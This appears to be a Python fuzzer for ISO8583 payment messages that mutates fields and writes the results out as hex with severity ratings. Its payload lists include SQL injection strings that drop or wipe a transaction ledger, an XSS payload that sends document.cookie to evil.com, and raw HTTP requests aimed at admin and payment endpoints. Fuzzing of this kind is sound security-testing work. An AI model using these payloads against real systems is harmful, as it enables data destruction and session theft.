#!/usr/bin/env python3
"""ISO8583 HISO93 message fuzzer — random field mutation for security testing."""

import random, argparse, struct, json, sys
from typing import Literal
from dataclasses import dataclass


MTIS = ["0100", "0110", "0120", "0200", "0210", "0220", "0400", "0420", "0800", "0810"]
RESPONSE_CODES = ["00", "01", "02", "03", "04", "05", "06", "07", "08", "10",
                 "11", "12", "13", "14", "15", "19", "21", "30", "91", "96"]

FUZZ_MUTATIONS = [
    "bit_flip",
    "length_overflow",
    "null_injection",
    "sql_injection",
    "xss_payload",
    "null_field",
    "overflow_field",
    "negative_amount",
    "expired_card",
    "invalid_mti",
    "truncated_bitmap",
    "wrong_currency",
    "stolen_card_flag",
    "high_amount",
    "zero_amount",
]

SQL_PAYLOADS = [
    "'; DROP TABLE tx_ledger;--",
    "' OR '1'='1",
    "'; SELECT * FROM memory--",
    "1; DELETE FROM tx_ledger WHERE 1=1--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "';<script>fetch('http://evil.com?c='+document.cookie)</script>",
    "><img src=x onerror=alert(1)>",
]

HTTP_PAYLOADS = [
    "GET /admin/config HTTP/1.1\r\nHost: neopay.io\r\n\r\n",
    "POST /api/payments HTTP/1.1\r\nHost: neopay.io\r\n\r\n{\"amount\": 999999}",
    "TRACE /internal HTTP/1.1\r\nHost: neopay.io\r\n\r\n",
]


@dataclass
class FuzzResult:
    mutation: str
    original_hex: str
    mutated_hex: str
    category: str
    severity: str
    description: str


def _build_base_msg(mti: str = "0100", pan: str = "4111111111111111") -> bytes:
    """Build a minimal valid ISO8583 binary message for fuzzing base."""
    mti_bytes = bytes.fromhex(mti)
    # Primary bitmap: field 2 present
    bitmap = bytearray([0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    pan_len = f"{len(pan):02d}".encode()
    pan_bytes = pan.encode()
    return mti_bytes + bytes(bitmap) + pan_len + pan_bytes


def bit_flip(data: bytes) -> bytes:
    """Flip random bits in message."""
    byte_idx = random.randint(0, len(data) - 1)
    byte_val = data[byte_idx]
    bit_idx = random.randint(0, 7)
    flipped = byte_val ^ (0x80 >> bit_idx)
    return data[:byte_idx] + bytes([flipped]) + data[byte_idx + 1:]


def length_overflow(data: bytes) -> bytes:
    """Overflow LL/LLL length prefix."""
    if len(data) > 10:
        pos = random.randint(5, min(15, len(data) - 3))
        # Increase the length bytes
        new_byte = min(data[pos] + random.randint(10, 200), 255)
        return data[:pos] + bytes([new_byte]) + data[pos + 1:]


def null_injection(data: bytes) -> bytes:
    """Inject null bytes."""
    pos = random.randint(2, len(data) - 1)
    return data[:pos] + b'\x00' * random.randint(1, 4) + data[pos:]


def sql_injection(data: bytes) -> bytes:
    """Inject SQL injection payloads — target field data areas."""
    payload = random.choice(SQL_PAYLOADS).encode()
    pos = random.randint(5, len(data))
    return data[:pos] + payload + data[pos:]


def xss_payload(data: bytes) -> bytes:
    """Inject XSS payloads."""
    payload = random.choice(XSS_PAYLOADS).encode()
    pos = random.randint(5, len(data))
    return data[:pos] + payload + data[pos:]


def null_field(data: bytes) -> bytes:
    """Remove critical fields by clearing bitmap bits."""
    if len(data) < 12:
        return data
    # Clear field 39 (response code) bitmap bit
    bitmap_byte = 4  # Byte position in bitmap for field 39
    bit = (39 - 1) % 8  # bit within byte
    new_bitmap = list(data[2:10])
    new_bitmap[bitmap_byte] &= ~(0x80 >> bit)
    return data[:2] + bytes(new_bitmap) + data[10:]


def overflow_field(data: bytes) -> bytes:
    """Write overflow value to amount fields."""
    if len(data) < 20:
        return data
    # Overwrite 12-byte amount field with max value
    overflow = b'999999999999'
    pos = random.choice([8, 15])
    return data[:pos] + overflow[:12] + data[pos + 12:]


def negative_amount(data: bytes) -> bytes:
    """Set negative amount in field 4."""
    if len(data) < 20:
        return data
    neg = b'-000000001000'
    return data[:8] + neg[:12] + data[20:]


def expired_card(data: bytes) -> bytes:
    """Set past expiration date in field 14."""
    if len(data) < 24:
        return data
    return data[:20] + b'0000' + data[24:]


def invalid_mti(data: bytes) -> bytes:
    """Corrupt MTI to invalid value."""
    invalid_mtis = ["9999", "0000", "0A00", "ZZZZ", "\x00\x00\x00\x00"]
    chosen = random.choice(invalid_mtis)
    if len(chosen) == 4:
        return chosen.encode() + data[4:]
    return bytes.fromhex("FFFF") + data[2:]


def truncated_bitmap(data: bytes) -> bytes:
    """Truncate bitmap to cause parsing errors."""
    if len(data) < 14:
        return data
    return data[:2] + data[2:random.randint(3, 8)]


def stolen_card_flag(data: bytes) -> bytes:
    """Set suspicious merchant/response indicators."""
    # Set response code to "pick up card" (04)
    if len(data) > 30:
        return data[:28] + b'04' + data[30:]


def high_amount(data: bytes) -> bytes:
    """Inject astronomically high transaction amount."""
    if len(data) > 20:
        high = b'999999999999'
        return data[:8] + high + data[20:]


def zero_amount(data: bytes) -> bytes:
    """Set zero amount — potential free goods exploit."""
    if len(data) > 20:
        return data[:8] + b'000000000000' + data[20:]


FUZZ_FUNCTIONS = {
    "bit_flip": bit_flip,
    "length_overflow": length_overflow,
    "null_injection": null_injection,
    "sql_injection": sql_injection,
    "xss_payload": xss_payload,
    "null_field": null_field,
    "overflow_field": overflow_field,
    "negative_amount": negative_amount,
    "expired_card": expired_card,
    "invalid_mti": invalid_mti,
    "truncated_bitmap": truncated_bitmap,
    "stolen_card_flag": stolen_card_flag,
    "high_amount": high_amount,
    "zero_amount": zero_amount,
}

SEVERITY = {
    "bit_flip": "MEDIUM",
    "length_overflow": "HIGH",
    "null_injection": "HIGH",
    "sql_injection": "CRITICAL",
    "xss_payload": "HIGH",
    "null_field": "MEDIUM",
    "overflow_field": "HIGH",
    "negative_amount": "CRITICAL",
    "expired_card": "MEDIUM",
    "invalid_mti": "MEDIUM",
    "truncated_bitmap": "MEDIUM",
    "stolen_card_flag": "HIGH",
    "high_amount": "CRITICAL",
    "zero_amount": "CRITICAL",
}


def fuzz(count: int = 10, mti: str = "0100") -> list[FuzzResult]:
    """Generate N fuzzed ISO8583 messages."""
    results = []
    base = _build_base_msg(mti)
    used_mutations = set()

    while len(results) < count:
        mutation_name = random.choice(FUZZ_MUTATIONS)
        fn = FUZZ_FUNCTIONS[mutation_name]
        try:
            mutated = fn(bytearray(base))
            result = FuzzResult(
                mutation=mutation_name,
                original_hex=bytes(base).hex().upper(),
                mutated_hex=bytes(mutated).hex().upper(),
                category="protocol_mutation",
                severity=SEVERITY[mutation_name],
                description=_describe(mutation_name),
            )
            results.append(result)
        except Exception:
            pass

    return results


def _describe(mutation: str) -> str:
    descriptions = {
        "bit_flip": "Single bit flipped in message — tests error handling",
        "length_overflow": "LL/LLL length prefix overflowed — buffer test",
        "null_injection": "Null bytes injected — string terminator attack",
        "sql_injection": "SQL injection in field data — database exploit test",
        "xss_payload": "XSS payload in field data — web interface exploit",
        "null_field": "Critical field removed via bitmap manipulation",
        "overflow_field": "Field overflowed with max value — range check bypass",
        "negative_amount": "Negative transaction amount — sign check bypass",
        "expired_card": "Past expiration date — card validation bypass",
        "invalid_mti": "Corrupted MTI — routing and parsing error handling",
        "truncated_bitmap": "Truncated primary bitmap — parsing edge case",
        "stolen_card_flag": "Response code set to 'pick-up' — fraud simulation",
        "high_amount": "Astronomical amount injected — fraud exploit",
        "zero_amount": "Zero amount — potential free goods exploit",
    }
    return descriptions.get(mutation, "Unknown mutation")


def main():
    parser = argparse.ArgumentParser(description="ISO8583 Fuzzer")
    parser.add_argument("-n", "--count", type=int, default=20, help="Number of mutations")
    parser.add_argument("--mti", default="0100", help="Base MTI")
    parser.add_argument("--output", help="Output file")
    parser.add_argument("--json", action="store_true", help="JSON output")
    args = parser.parse_args()

    results = fuzz(args.count, args.mti)

    if args.json:
        output = {
            "fuzzer": "ISO8583-HISO93-Fuzzer",
            "base_mti": args.mti,
            "total_mutations": len(results),
            "results": [vars(r) for r in results]
        }
        data = json.dumps(output, indent=2)
    else:
        lines = [f"ISO8583 Fuzzer — {len(results)} mutations"]
        for r in results:
            lines.append(f"\n[{r.severity}] {r.mutation}")
            lines.append(f"  Orig: {r.original_hex[:40]}...")
            lines.append(f"  Mutd: {r.mutated_hex[:40]}...")
            lines.append(f"  {r.description}")
        data = "\n".join(lines)

    if args.output:
        with open(args.output, "w") as f:
            f.write(data)
        print(f"Fuzz results written to {args.output}")
    else:
        print(data)


if __name__ == "__main__":
    main()
